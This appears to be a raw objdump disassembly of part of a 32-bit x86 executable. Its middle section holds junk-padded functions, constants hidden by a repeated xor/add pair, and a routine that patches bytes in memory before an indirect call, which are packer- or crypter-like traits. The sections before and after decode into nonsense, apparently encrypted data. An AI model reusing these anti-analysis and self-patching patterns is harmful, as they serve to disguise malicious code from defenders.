  40b13f:	adc    al,cl
  40b141:	mov    DWORD PTR [edi+ebp*1+0x693732b6],esi
  40b148:	mov    DWORD PTR [ebp+0x7a],eax
  40b14b:	sbb    al,0x40
  40b14d:	cmp    eax,0xb9ba719c
  40b152:	and    eax,0xa5de5088
  40b157:	push   di
  40b159:	mov    eax,ds:0x9f064c4f
  40b15e:	sub    eax,0x19a67ec
  40b163:	icebp  
  40b164:	in     eax,0x64
  40b166:	jno    0x40b152
  40b168:	push   ebx
  40b169:	and    BYTE PTR [edx-0x72],bl
  40b16c:	pop    ds
  40b16d:	sub    bl,cl
  40b16f:	jae    0x40b18d
  40b171:	mov    ebx,0x81dd8a2c
  40b176:	pop    edi
  40b177:	xor    dh,BYTE PTR [ecx-0x118f4818]
  40b17d:	(bad)  
  40b17e:	xor    BYTE PTR [eax],al
  40b180:	sub    al,0x8a
  40b182:	cmp    cl,BYTE PTR [ebx]
  40b184:	iret   
  40b185:	mov    esp,0xeb7768f3
  40b18a:	mov    ch,0xc3
  40b18c:	xchg   ecx,eax
  40b18d:	std    
  40b18e:	hlt    
  40b18f:	add    bl,BYTE PTR ds:0x2c6c440c
  40b195:	ss cmp al,0x8b
  40b198:	inc    ebp
  40b199:	sbb    BYTE PTR [ebx+0x46891075],cl
  40b19f:	or     al,0x8b
  40b1a1:	inc    ebp
  40b1a2:	sbb    al,0x8b
  40b1a4:	jne    0x40b1b6
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xf76c66d7
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx+0x59]
  40bac3:	aas    
  40bac4:	and    DWORD PTR [eax],0xfea10b71
  40baca:	bound  ecx,QWORD PTR [ecx+0xf862605]
  40bad0:	mov    ecx,0xe0be3d78
  40bad5:	out    0x9b,al
  40bad7:	ins    BYTE PTR es:[edi],dx
  40bad8:	sbb    dh,ch
  40bada:	es add esi,0xad02b03a
  40bae1:	rcr    BYTE PTR [esi],1
  40bae3:	je     0x40ba9f
  40bae5:	inc    ebp
  40bae6:	jecxz  0x40baa1
  40bae8:	in     eax,0x5e
  40baea:	xor    BYTE PTR [eax-0x1e],ah
  40baed:	sar    DWORD PTR [edx],1
  40baef:	ret    0x45e5
  40baf2:	jne    0x40bb0e
  40baf4:	shl    DWORD PTR [ecx],cl
  40baf6:	inc    ebx
  40baf7:	adc    al,0xa4
  40baf9:	sbb    dh,BYTE PTR [ebx]
  40bafb:	cmp    edx,esi
  40bafd:	clc    
  40bafe:	xchg   edx,eax
  40baff:	pop    edi
  40bb00:	sub    BYTE PTR [esi-0x43],ch
  40bb03:	in     eax,dx
  40bb04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb05:	inc    edx
  40bb06:	xor    ebx,esp
  40bb08:	les    esp,FWORD PTR [edx-0x10539d6e]
  40bb0e:	retf   
  40bb0f:	aam    0xb8
  40bb11:	jmp    0x4957:0xa068e6d1
  40bb18:	sbb    BYTE PTR [edx],bl
  40bb1a:	inc    edx
  40bb1b:	imul   esp,DWORD PTR [edx+0x7a],0x1
  40bb1f:	shl    DWORD PTR [ebx+0x68d83ba],cl
  40bb25:	rcr    DWORD PTR [edx-0x48866eee],0x2c
  40bb2c:	mov    ebp,0xa122c8f4
  40bb31:	adc    al,0xb6
  40bb33:	mov    edx,0x7d9e34e5
  40bb38:	clc    
  40bb39:	div    BYTE PTR [eax+0xf489a41]
  40bb3f:	mov    ebx,0x4c9a1d35
  40bb44:	repnz mov edi,0xd280f36b
  40bb4a:	jge    0x40bb5f
  40bb4c:	inc    esi
  40bb4d:	or     eax,0x8ad4a98d
  40bb52:	pushf  
  40bb53:	fldcw  WORD PTR ds:0xf898e2ad
  40bb59:	imul   esi,DWORD PTR [ebp+0x1f],0x6e87583
  40bb60:	(bad)  
  40bb61:	dec    ebx
  40bb62:	xchg   edx,eax
  40bb63:	adc    edx,DWORD PTR [edx]
  40bb65:	xor    esi,DWORD PTR [esi+ebx*4]
  40bb68:	xor    ebx,DWORD PTR [edx]
  40bb6a:	inc    ebx
  40bb6b:	sti    
  40bb6c:	rol    BYTE PTR [edi],1
  40bb6e:	lahf   
  40bb6f:	mov    al,ds:0x5a229083
  40bb74:	push   0x42
  40bb76:	push   es
  40bb77:	es in  al,0x25
  40bb7a:	sahf   
  40bb7b:	jno    0x40bbd7
  40bb7d:	mov    esp,0xddbd79fc
  40bb82:	test   ah,0xb
  40bb85:	or     bl,BYTE PTR [esi-0x1ddda00d]
  40bb8b:	jecxz  0x40bbbb
  40bb8d:	jmp    0x6085:0x30394b2
  40bb94:	test   BYTE PTR [edx-0x55d3cc17],dh
  40bb9a:	mov    ds:0x44532729,al
  40bb9f:	mov    edi,0xfb0c059f
  40bba4:	(bad)
  40bba7:	cmc    
  40bba8:	stos   BYTE PTR es:[edi],al
  40bba9:	push   ebx
  40bbaa:	pop    es
  40bbab:	jle    0x40bbcf
  40bbad:	mov    al,0xc1
  40bbaf:	inc    ebx
  40bbb0:	inc    ebp
  40bbb1:	and    al,0x68
  40bbb3:	pop    esp
  40bbb4:	jbe    0x40bbaa
  40bbb6:	xor    bh,BYTE PTR [edi-0x1c]
  40bbb9:	jae    0x40bc04
  40bbbb:	xor    dh,dh
  40bbbd:	fscale 
  40bbbf:	mov    ebx,0xbd18a485
  40bbc4:	loopne 0x40bb7a
  40bbc6:	in     eax,dx
  40bbc7:	mov    ebx,ecx
  40bbc9:	push   ecx
  40bbca:	sub    BYTE PTR [ebx-0x74],0xe0
  40bbce:	movd   mm1,DWORD PTR [ecx-0x231b1a7]
  40bbd5:	jb     0x40bc0f
  40bbd7:	ret    
